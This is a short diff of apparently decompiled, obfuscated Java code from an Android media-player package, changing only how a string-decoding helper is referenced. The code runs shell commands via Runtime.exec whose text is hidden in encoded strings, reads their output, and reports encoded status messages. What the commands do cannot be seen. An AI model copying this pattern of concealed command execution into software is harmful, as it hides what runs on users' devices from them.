@@ -12,10 +12,10 @@ class cs extends Thread {
     public void run() {
         cr.b = true;
         try {
-            Runtime.getRuntime().exec(a.a("OTshTlkhdGtO"));
+            Runtime.getRuntime().exec(com.arix.player.a.a("OTshTlkhdGtO"));
             Throwable th = null;
             try {
-                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(a.a("OTshTlkh")).getInputStream()));
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(com.arix.player.a.a("OTshTlkh")).getInputStream()));
                 try {
                     String line = bufferedReader.readLine();
                     do {
@@ -27,10 +27,10 @@ class cs extends Thread {
                         }
                     } while (line != null);
                     if (cr.b) {
-                        cr.a(a.a("GTshSl0ndCFCTHU/L0FUMDBoDWowJzJMSiE9KEoW"));
+                        cr.a(com.arix.player.a.a("GTshSl0ndCFCTHU/L0FUMDBoDWowJzJMSiE9KEoW"));
                         cr.a();
                     } else {
-                        cr.a(a.a("GTshSl0ndDVZVyUkI0kW"));
+                        cr.a(com.arix.player.a.a("GTshSl0ndDVZVyUkI0kW"));
                     }
                 } finally {
                     bufferedReader.close();
